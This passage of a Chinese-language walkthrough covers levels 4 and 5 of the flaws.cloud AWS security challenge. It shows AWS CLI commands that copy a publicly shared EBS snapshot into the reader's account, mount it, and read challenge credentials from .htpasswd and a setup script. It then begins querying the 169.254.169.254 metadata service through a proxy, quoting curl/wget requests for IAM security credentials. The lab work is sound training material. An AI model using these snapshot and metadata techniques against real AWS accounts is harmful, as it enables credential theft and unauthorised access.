### 优化后的文本

在给定的JSON数据中，找到`"SnapshotId": "snap-0b49342abd1bdcb89"`。接下来，检查该快照的`createVolumePermission`属性：

```bash
~$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws
{
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

结果表明，任何人都可以基于此快照创建卷。现在使用自己的AWS账户创建一个基于该快照的卷，并使用自己的SSH密钥登录EC2实例。

```bash
~$ aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89
{
    "AvailabilityZone": "us-west-2a",
    "MultiAttachEnabled": false,
    "Tags": [],
    "Encrypted": false,
    "VolumeType": "gp2",
    "VolumeId": "vol-00b0a21eafbe8f81b",
    "State": "creating",
    "Iops": 100,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "CreateTime": "2020-03-22T08:43:49.000Z",
    "Size": 8
}
```

在自己的AWS管理控制台中，可以看到基于该快照的卷已成功创建。接着启动一个免费的EC2实例：

```bash
~$ aws ec2 describe-instances
{
    ...
    "InstanceId": "i-056b17b87e47e8896",
    ...
}
```

将新创建的卷挂载到实例的`/dev/sdf`设备上：

```bash
~$ aws ec2 attach-volume --volume-id vol-00b0a21eafbe8f81b --instance-id i-056b17b87e47e8896 --device /dev/sdf
{
    ...
    "State": "attaching",
    "Device": "/dev/sdf"
}
```

使用SSH密钥登录EC2实例，以查找敏感信息或文件：

```bash
~$ ssh -i  ubuntu@34.*.*.*.*
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1057-aws x86_64)
...
ubuntu@ip-172-31-21-33:~$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0     7:0    0 89.1M  1 loop /snap/core/8268
loop1     7:1    0   18M  1 loop /snap/amazon-ssm-agent/1480
xvda    202:0    0    8G  0 disk
└─xvda1 202:1    0    8G  0 part /
xvdf    202:80   0    8G  0 disk
└─xvdf1 202:81   0    8G  0 part
```

发现了一个新的虚拟磁盘`/dev/xvdf1`，创建一个挂载点并挂载该磁盘：

```bash
ubuntu@ip-172-31-21-33:~$ sudo mkdir /mnt/flaws
ubuntu@ip-172-31-21-33:~$ sudo mount /dev/xvdf1 /mnt/flaws
ubuntu@ip-172-31-21-33:~$ mount
...
/dev/xvdf1 on /mnt/flaws type ext4 (rw,relatime,data=ordered)
```

查看挂载点中的内容：

```bash
ubuntu@ip-172-31-21-33:~$ ls -l /mnt/flaws/
total 104
drwxr-xr-x  2 root root  4096 Feb 13  2017 bin
drwxr-xr-x  3 root root  4096 Feb 22  2017 boot
drwxr-xr-x  5 root root  4096 Jan 13  2017 dev
drwxr-xr-x 94 root root  4096 Feb 19  2017 etc
drwxr-xr-x  3 root root  4096 Feb 12  2017 home
lrwxrwxrwx  1 root root    32 Feb 22  2017 initrd.img -> boot/initrd.img-4.4.0-64-generic
lrwxrwxrwx  1 root root    32 Feb 21  2017 initrd.img.old -> boot/initrd.img-4.4.0-63-generic
drwxr-xr-x 21 root root  4096 Jan 13  2017 lib
drwxr-xr-x  2 root root  4096 Jan 13  2017 lib64
drwx------  2 root root 16384 Jan 13  2017 lost+found
drwxr-xr-x  2 root root  4096 Jan 13  2017 media
drwxr-xr-x  2 root root  4096 Jan 13  2017 mnt
drwxr-xr-x  2 root root  4096 Jan 13  2017 opt
drwxr-xr-x  2 root root  4096 Apr 12  2016 proc
drwx------  3 root root  4096 Feb 19  2017 root
drwxr-xr-x  6 root root  4096 Jan 13  2017 run
drwxr-xr-x  2 root root 12288 Feb 13  2017 sbin
drwxr-xr-x  2 root root  4096 Jan  3  2017 snap
drwxr-xr-x  2 root root  4096 Jan 13  2017 srv
drwxr-xr-x  2 root root  4096 Feb  5  2016 sys
drwxrwxrwt  8 root root  4096 Feb 28  2017 tmp
drwxr-xr-x 10 root root  4096 Jan 13  2017 usr
drwxr-xr-x 14 root root  4096 Feb 12  2017 var
lrwxrwxrwx  1 root root    29 Feb 22  2017 vmlinuz -> boot/vmlinuz-4.4.0-64-generic
lrwxrwxrwx  1 root root    29 Feb 21  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-63-generic
```

看起来这是一个Linux系统。从哪里可以找到包含认证信息的文件呢？根据之前的描述，当Nginx在EC2上部署后会创建一个快照，因此Nginx是一个突破口。

查看Nginx配置目录的内容：

```bash
ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ ls -al
total 68
drwxr-xr-x  6 root root 4096 Feb 19  2017 .
drwxr-xr-x 94 root root 4096 Feb 19  2017 ..
-rw-r--r--  1 root root   44 Feb 13  2017 .htpasswd
drwxr-xr-x  2 root root 4096 Oct 27  2016 conf.d
-rw-r--r--  1 root root 1077 Apr 26  2016 fastcgi.conf
-rw-r--r--  1 root root 1007 Apr 26  2016 fastcgi_params
-rw-r--r--  1 root root 2837 Apr 26  2016 koi-utf
-rw-r--r--  1 root root 2223 Apr 26  2016 koi-win
-rw-r--r--  1 root root 3957 Apr 26  2016 mime.types
-rw-r--r--  1 root root 1533 Feb 19  2017 nginx.conf
-rw-r--r--  1 root root  180 Apr 26  2016 proxy_params
-rw-r--r--  1 root root  636 Apr 26  2016 scgi_params
drwxr-xr-x  2 root root 4096 Feb 19  2017 sites-available
drwxr-xr-x  2 root root 4096 Feb 19  2017 sites-enabled
drwxr-xr-x  2 root root 4096 Feb 12  2017 snippets
-rw-r--r--  1 root root  664 Apr 26  2016 uwsgi_params
-rw-r--r--  1 root root 3071 Apr 26  2016 win-utf
```

`.htpasswd`文件看起来很可疑：

```bash
ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ cat .htpasswd
flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0
```

这应该是一串加密的密码，用户名：`flaws`，密码（加密）：`$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0`。尝试在`http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/`进行登录，但未成功，可能需要明文密码。

继续寻找可疑的目录和文件，在`/home/ubuntu/`目录中发现了一个名为`setupNginx.sh`的脚本：

```bash
ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ cat setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

`nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`应该是明文密码。尝试用该密码登录，成功通过了第4关。

### 小结
- 在AWS中允许创建EC2实例的快照，主要目的是进行备份。然而，如果忘记密码，可以通过快照来访问EC2实例，这也正是攻击者感兴趣的地方。

## Level 5
> 这个EC2实例上有一个简单的HTTP代理。请尝试使用这个代理来列出位于`http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/`的存储桶`level6`中的隐藏目录。

直接在浏览器中访问`http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/`，结果显示`Access Denied`。Level 5的EC2实例提供了一个代理，目标点应该在这个代理中寻找。

在Level 4中，我在`/mnt/flaws/home/ubuntu/.bash_history`文件中发现了一些有趣的信息：

```bash
ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ cat .bash_history
...
cat setupNginx.sh
curl 169.254.169.254
curl  http://169.254.169.254/latest/meta-data
wget  http://169.254.169.254/latest/meta-data
cat meta-data
curl -XGET http://169.254.169.254/latest/meta-data
wget  http://169.254.169.254/latest/meta-data/iam
cat iam
wget  http://169.254.169.254/latest/meta-data/iam/info
cat info
rm info iam
ls
cat meta-data
curl  http://169.254.169.254/latest/meta-data/iam/info
curl  http://169.254.169.254/latest/meta-data/
curl  http://169.254.169.254/latest/meta-data/profile/
curl  http://169.254.169.254/latest/meta-data/profile
curl  http://169.254.169.254/latest/user-data
curl  http://169.254.169.254/iam/security-credentials/flaws
curl  http://169.254.169.254/iam/security-credentials
curl  http://169.254.169.254/iam/security-credentials/flaws/
curl  http://169.254.169.254/iam/
wget http://169.254.169.254/iam/security-credentials/flaws
curl  http://169.254.169.254/meta-data/iam/security-credentials/flaws
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials
sudo su -
...
```

注意到其中包含了对`169.254.169.254`这个IP地址的操作。`169.254.169.254`是云服务（包括AWS）上的元数据服务地址。我们可以利用代理来获取自身的元数据，或许能找到一些认证文件或敏感信息。

尝试访问`http://169.254.169.254/latest/meta-data/`，得到了一系列文件目录：

```bash
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
```

这些信息可能有助于进一步探索和攻击。